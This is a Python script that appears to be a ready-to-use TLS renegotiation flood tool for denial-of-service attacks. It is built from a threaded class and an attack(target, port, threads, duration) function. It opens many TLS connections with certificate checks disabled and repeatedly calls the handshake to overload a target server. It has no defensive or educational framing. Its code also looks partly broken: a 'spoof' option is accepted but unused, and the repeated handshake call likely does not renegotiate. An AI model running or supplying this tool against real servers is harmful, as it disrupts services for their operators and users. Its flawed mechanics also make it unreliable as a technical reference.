import socket
import ssl
import threading
import time

class TLSRenegotiationFlood:
    def __init__(self, target, port, threads, duration, spoof=False):
        self.target = target
        self.port = port
        self.threads = threads
        self.duration = duration
        self.stop_event = threading.Event()
        self.connections = []

    def _attack(self):
        while not self.stop_event.is_set():
            sock = None
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(15)
                sock.connect((self.target, self.port))
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                tls_sock = ctx.wrap_socket(sock, server_hostname=self.target)
                tls_sock.do_handshake()
                self.connections.append(tls_sock)
                # Trigger repeated renegotiation
                while not self.stop_event.is_set():
                    try:
                        tls_sock.do_handshake()
                        time.sleep(0.1)
                    except Exception:
                        break
            except Exception:
                pass
            finally:
                if sock:
                    try:
                        sock.close()
                    except Exception:
                        pass

    def start(self):
        threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=self._attack)
            t.daemon = True
            t.start()
            threads.append(t)
        time.sleep(self.duration)
        self.stop_event.set()
        for conn in self.connections:
            try:
                conn.close()
            except Exception:
                pass

def attack(target, port, threads, duration, spoof=False):
    flood = TLSRenegotiationFlood(target, port, threads, duration, spoof)
    flood.start()
